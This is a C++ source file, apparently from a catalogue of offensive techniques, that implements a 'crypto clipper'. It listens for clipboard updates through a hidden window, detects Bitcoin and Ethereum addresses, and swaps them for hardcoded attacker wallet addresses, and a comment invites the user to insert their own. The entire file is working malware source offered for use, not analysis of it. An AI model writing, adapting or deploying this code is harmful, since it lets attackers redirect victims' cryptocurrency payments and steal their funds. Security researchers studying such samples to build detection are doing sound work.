/*
Title: Crypto Clipping
Description: This technique monitors clipboard in the target system, then replaces the victim's wallet address with the attacker's wallet address.
Notes:
	- The functions which check a wallet address are not necessarily accurate.
*/
#include <Windows.h>
#include <stdio.h>
#include <cstring>

#define MAX_BUFFER 1024

// Replace the following addresses with your own.
constexpr const char* evilAddressOfBitcoin = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa";
constexpr const char* evilAddressOfEthereum = "0x32Be343B94f860124dC4fEe278FDCBD38C102D88";

constexpr const DWORD dwWalletTypeBitcoin = 1;
constexpr const DWORD dwWalletTypeEthereum = 2;

BOOL IsBitcoinAddress(const char* str) {
	size_t length = strlen(str);

	// Base58
	if (str[0] == '1' || str[0] == '3') {
		if (length < 26 || 35 < length) {
			return FALSE;
		}

		for (size_t i = 0; i < length; i++) {
			char c = str[i];

			if (!((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || (c >= '1' && c <= '9'))) {
				return FALSE;
			} 
		}

		return TRUE;
	}

	// SegWit (Bech32)
	if (strncmp(str, "bc1q", 4) == 0) {
		if (length != 42 && length != 62) {
			return FALSE;
		}

		for (size_t i = 4; i < length; i++) {
			char c = str[i];

			if (!((c >= 'a' && c <= 'z') || (c >= '1' && c <= '9'))) {
				return FALSE;
			}

			if (c == '1' || c == 'b' || c == 'i' || c == 'o') {
				return FALSE;
			}
		}

		return TRUE;
	}

	// Taproot
	if (strncmp(str, "bc1p", 4) == 0) {
		if (length != 62) {
			return FALSE;
		}

		for (size_t i = 4; i < length; i++) {
			char c = str[i];

			if (!((c >= 'a' && c <= 'z') || (c >= '0' && c <= '9'))) {
				return FALSE;
			}
		}

		return TRUE;
	}

	return FALSE;
}

BOOL IsEthereumAddress(const char* str) {
	size_t length = strlen(str);

	if (strncmp(str, "0x", 2) != 0 || length != 42) {
		return FALSE;
	}

	for (size_t i = 2; i < length; i++) {
		char c = str[i];
		if (!((c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F'))) {
			return FALSE;
		}
	}

	return TRUE;
}

BOOL GetClipboardContent(char* sContent, DWORD dwMaxContentSize, DWORD* dwBytesRead) {
	if (OpenClipboard(nullptr)) {
		if (IsClipboardFormatAvailable(CF_TEXT)) {
			HANDLE hData = GetClipboardData(CF_TEXT);
			if (hData) {
				char* sData = static_cast<char*>(GlobalLock(hData));
				if (sData) {
					*dwBytesRead = GlobalSize(hData);
					if (*dwBytesRead < dwMaxContentSize) {
						strcpy_s(sContent, *dwBytesRead, sData);
					}
					GlobalUnlock(hData);
				}
			}
		}
		CloseClipboard();
	}
	else {
		return FALSE;
	}

	return TRUE;
}

VOID SetWalletAddressToClipboard(const char* evilAddress) {
	// Process clipboard for setting the wallet address.
	if (OpenClipboard(nullptr)) {
		if (EmptyClipboard()) {		
			HGLOBAL hGlobal = GlobalAlloc(GMEM_MOVEABLE, (strlen(evilAddress) + 1) * sizeof(char));
			if (hGlobal) {
				char* pGlobal = static_cast<char*>(GlobalLock(hGlobal));
				if (pGlobal) {
					memcpy(pGlobal, evilAddress, strlen(evilAddress) + 1);
					GlobalUnlock(hGlobal);
				}

				SetClipboardData(CF_TEXT, hGlobal);
				GlobalFree(hGlobal);
			}
		}
		CloseClipboard();
	}
}

LRESULT CALLBACK WindowProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
	return DefWindowProc(hWnd, uMsg, wParam, lParam);
}

BOOL CryptoClipping() {
	DWORD dwDuration = 1 * 60 * 1000; // = Monitors in 1 minute. Replace it with your prefered time.

	LPCWSTR lpClassName = L"MyMonitor";
	WNDCLASS wc = {};
	wc.lpfnWndProc = WindowProc;
	wc.hInstance = GetModuleHandle(nullptr);
	wc.lpszClassName = lpClassName;

	RegisterClass(&wc);

	HWND hWnd = CreateWindowEx(
		0,
		lpClassName,
		lpClassName,
		0,
		0,
		0,
		0,
		0,
		nullptr,
		nullptr,
		wc.hInstance,
		nullptr
	);
	if (!hWnd) {
		return FALSE;
	}

	// Start monitoring.
	AddClipboardFormatListener(hWnd);

	DWORD dwBytesRead = 0;

	DWORD dwStartTime = GetTickCount64();

	MSG msg;
	while (TRUE) {
		while (PeekMessage(&msg, nullptr, 0, 0, PM_REMOVE)) {
			TranslateMessage(&msg);
			DispatchMessage(&msg);

			if (msg.message == WM_CLIPBOARDUPDATE) {
				char sContent[MAX_BUFFER];
				if (GetClipboardContent(sContent, sizeof(sContent), &dwBytesRead)) {
					char* pContent = new char[dwBytesRead + 1];
					memcpy(pContent, sContent, dwBytesRead);
					pContent[dwBytesRead] = '\0';

					// Check if the content is a wallet address then set the attacker's address.
					if (IsBitcoinAddress(pContent)) {
						SetWalletAddressToClipboard(evilAddressOfBitcoin);
					}
					else if (IsEthereumAddress(pContent)) {
						SetWalletAddressToClipboard(evilAddressOfEthereum);
					}
				}
			}
		}

		// Check elapsed time.
		if (GetTickCount64() - dwStartTime >= dwDuration)
			break;

		Sleep(100);
	}

	// Stop monitoring.
	RemoveClipboardFormatListener(hWnd);

	return TRUE;
}
